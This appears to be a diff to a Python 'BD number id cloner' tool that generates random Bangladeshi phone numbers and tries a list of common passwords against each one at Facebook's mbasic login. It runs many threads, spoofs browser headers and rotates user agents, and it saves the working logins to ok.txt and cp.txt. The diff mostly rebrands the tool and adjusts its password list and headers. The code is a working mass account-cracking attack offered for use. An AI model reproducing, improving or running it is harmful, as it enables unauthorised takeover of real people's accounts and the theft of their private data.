@@ -18,7 +18,7 @@ import mechanize
 import string
 print('[\033[1;32mâœ“\033[1;37m] Wait For Connect Server !! ')
 os.system('git pull')
-os.system(f'xdg-open https://facebook.com/groups/indianscommunitygeorgia/')
+os.system(f'xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
 time.sleep(2.00)
 try:
     import requests
@@ -213,25 +213,23 @@ os.system("clear")
 print(" \033[92;1m[MRX JIBON] JOIN MY FACEBOOK GROUP  ")
 os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
 os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
-logo = ("""
-\x1b[1;96m   ╭━╮╭━┳━━━┳━╮╭━╮╱╱╱╱╭┳━━┳━━╮╭━━━┳━╮╱╭╮
-\x1b[1;96m   ┃┃╰╯┃┃╭━╮┣╮╰╯╭╯╱╱╱╱┃┣┫┣┫╭╮┃┃╭━╮┃┃╰╮┃┃
-\x1b[1;96m   ┃╭╮╭╮┃╰━╯┃╰╮╭╯╱╱╱╱╱┃┃┃┃┃╰╯╰┫┃╱┃┃╭╮╰╯┃
-\x1b[1;96m   ┃┃┃┃┃┃╭╮╭╯╭╯╰╮╱╱╱╭╮┃┃┃┃┃╭━╮┃┃╱┃┃┃╰╮┃┃
-\x1b[1;96m   ┃┃┃┃┃┃┃┃╰┳╯╭╮╰╮╭╮┃╰╯┣┫┣┫╰━╯┃╰━╯┃┃╱┃┃┃
-\x1b[1;96m   ╰╯╰╯╰┻╯╰━┻━╯╰━╯╰┫╰━━┻━━┻━━━┻━━━┻╯╱╰━╯
-\x1b[1;96m   ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╯        
-  \x1b[1;96m--------------------------------------------------
-  [~] AUTHOR   : JIBON SARKER
-  [~] FACEBOOK : MD JIBON ISLAM
-  [~] FACEBOOK : JIBON SARKAR
-  [~] TOOL     : BD RANDOM/\033[1;97m\033[1;45mSTARTED PROCESS 5 MIN\033[1;0m\033[1;97m\033[38;5;46m
-  [~] VERSION  : \033[1;97m\033[1;45m0.0\033[1;0m\033[1;97m\033[38;5;46m+\033[1;97m\033[1;45mFAST CLONE\033[1;0m\033[1;97m\033[38;5;46m
-  \x1b[1;96m----------------------------------------------""")
+logo=("""  
+   \33[35;1m╱╱╭╮\33[34;1m╭━━╮\33[33;1m╭━━╮╱\33[1;97m╭━━━╮\33[31;1m╭━╮╱╭╮
+   \33[35;1m╱╱┃┃\33[34;1m╰┫┣╯\33[33;1m┃╭╮┃╱\33[1;97m┃╭━╮┃\33[31;1m┃┃╰╮┃┃
+   \33[35;1m╱╱┃┃╱\33[34;1m┃┃╱\33[33;1m┃╰╯╰╮\33[1;97m┃┃╱┃┃\33[31;1m┃╭╮╰╯┃
+   \33[35;1m╭╮┃┃╱\33[34;1m┃┃╱\33[33;1m┃╭━╮┃\33[1;97m┃┃╱┃┃\33[31;1m┃┃╰╮┃┃
+   \33[35;1m┃╰╯┃\33[34;1m╭┫┣╮\33[33;1m┃╰━╯┃\33[1;97m┃╰━╯┃\33[31;1m┃┃╱┃┃┃
+   \33[35;1m╰━━╯\33[34;1m╰━━╯\33[33;1m╰━━━╯\33[1;97m╰━━━╯\33[31;1m╰╯╱╰━╯
+\33[32;1m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐
+  ┏━[•] Author   : MD JIBON SARKER
+  ┗━[•] Facebook : Md Jibon Islam
+  ┏━[•] Tool     : FREE
+  ┗━[•] Version  : 2.1
+\33[32;1m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘""")
 def Main():
 	os.system('clear')
 	print(logo)
-	print('[\033[1;32m1\033[1;37m] Mathod 1 [\033[1;32mSlow <> Fire\033[1;37m] ')
+	print('[\033[1;32m1\033[1;37m] Mathod 1 [\033[1;32mSlow \ Fire\033[1;37m] ')
 	print('[\033[1;32m2\033[1;37m] Mathod 2 [\033[1;32mWorking\033[1;37m] ')
 	#print("[\033[1;32m3\033[1;37m] Mathod 3")
 	#print('[\033[1;32m!\033[1;37m] More Mathod Added Soon ')
@@ -258,32 +256,33 @@ def mathod1():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print(" [\033[1;32m1\033[1;37m] BD SIM CODE  : \033[1;32m016 - 017 - 018 - 019\033[1;37m ")
-	kode = input(' [\033[1;32m2\033[1;37m] SELECT       : ')
-	doamin = ' Ã°ÂÂÂÃ°ÂÂÆ’ Ã°ÂÂÂÃ°ÂÂÂ®Ã°ÂÂÂ¦Ã°ÂÂâ€ºÃ°ÂÂÅ¾Ã°ÂÂÂ« Ã°ÂÂÅ“Ã°ÂÂÂ¥Ã°ÂÂÂ¨Ã°ÂÂÂ§Ã°ÂÂÅ¾Ã°ÂÂÂ« '
-	print(" [\033[1;32m3\033[1;37m] TOTAL ACCOUNT: \033[1;32m2000 - 5000 - 10000\033[1;37m ")
-	limit = int(input(' [\033[1;32m4\033[1;37m] LIMIT : '))
+	print(" \33[33;1m┏━[•] BD SIM CODE 017 018 019 013 015 016]")
+	kode = input(' \33[33;1m┗━[+] SELECT : ')
+	doamin = ' BD Number id cloner [ONLY-OK] '
+	print(' \33[33;1m┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
+	limit = int(input(' \33[33;1m┗━[+] LIMIT : '))
 	for nmbr in range(limit):
 		koda = ''.join(random.choice(string.digits) for _ in range(2))
 		kodb = ''.join(random.choice(string.digits) for _ in range(2))
 		nmp = ''.join(random.choice(string.digits) for _ in range(4))
 		user.append(nmp)
-	with ThreadPool(max_workers=100) as yaari:
+	with ThreadPool(max_workers=60) as yaari:
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' TOTAL ACCOUNT :\033[1;92m '+tl)
-		print(f' \033[1;37mBD SIM CODE   :\033[1;92m {kode}\033[1;37m ')
-		print(' USE [\033[1;32mAIRPLANE\033[1;37m] MODE FOR Ok IDS')
-		# print(' â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
+		print('\33[33;1m┏━[•] COUNTRY    : Bangladesh')
+		print('\33[33;1m┣━[•] TOTAL ID   :  '+tl)
+		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
+		print('\33[33;1m┗━[•] \033[1;92mSTART BD NAMBER MIXT CRACKING... ')
+		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+kode+'BANGLADESH','Bangladesh','bangladesh','Free fire','free fire','I Love You','I love you','i love you','123@@@','@@@###','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya','113355','22334455','121235']
-			yaari.submit(a,uid,pwx,tl)
-	print(47*'\033[1;31m\033[1;37m')
-	print(' [\033[1;32m!\033[1;37m] Cracking Complete')
-	print(' [\033[1;32m!\033[1;37m] Ok Ids Save [\033[1;32mÃ¢Å¸Â©\033[1;37m] /sdcard/LIVE Ã¢â‚¬Â¢RANDOMÃ¢â‚¬Â¢OK.txt')
-	print(47*'\033[1;31m\033[1;37m')
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya']
+			yaari.submit(b,uid,pwx,tl)
+	print(50*'_')
+	print(' [-] Crack process has been completed')
+	print(' [-] Ids saved in ok.txt,cp.txt')
+	print(50*'_')
 	exit()
 
 def mathod2():
@@ -326,13 +325,13 @@ def a(uid,pwx,tl):
     try:
         for ps in pwx:        	            
             session = requests.Session()
-            sys.stdout.write(f'\r [LIVE  M1] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r [JIBON-M1] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
@@ -343,11 +342,12 @@ def a(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
             'method':'GET',
-            'path': '/',
+            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
             'scheme':'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
+            'cache-control': 'max-age=0',  
+            'referer': 'https://mbasic.facebook.com/',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
             'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
@@ -356,7 +356,7 @@ def a(uid,pwx,tl):
             'sec-ch-ua-platform-version': '"12.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
+            'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro,}
